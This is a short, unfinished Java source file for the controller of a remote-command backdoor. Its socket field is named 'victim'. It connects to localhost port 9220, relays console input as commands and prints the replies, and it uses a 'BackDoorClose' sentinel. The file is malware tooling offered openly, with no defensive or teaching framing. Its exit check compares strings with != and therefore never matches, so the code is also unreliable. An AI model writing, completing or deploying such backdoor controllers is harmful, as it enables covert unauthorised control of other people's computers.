package remoteConnection;
//DA COMPLETARE
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

public class MandaComandi extends Thread{

    private Socket victim;
    private BufferedReader in;
    private PrintWriter out;

    public MandaComandi(String ip, int port)
    {
        victim=null;
        while(victim==null)
        try
        {
            victim=new Socket(ip,port);
            in=new BufferedReader(new InputStreamReader(victim.getInputStream()));
            out = new PrintWriter(victim.getOutputStream(), true);
        }
        catch(Exception e)
        {
            e.printStackTrace();
            victim=null;
        }
    }

    public void run()
    {
        String msg="";
        while(msg!=null)
        {
            try
            {
                msg=in.readLine();
                if(msg!=null)
                {
                    System.out.println(msg+"\n");
                }

            }
            catch(Exception e)
            {

            }
        }
    }
    public void sendCommand()
    {
        Scanner input=new Scanner(System.in);
        String command="";

        while(command!="BackDoorClose")
        {
            command=input.nextLine();
            out.println(command);
        }

    }

    public static void main(String[] args)
    {
        MandaComandi a;
        a=new MandaComandi("localhost", 9220);
        a.start();
        a.sendCommand();
    }

}
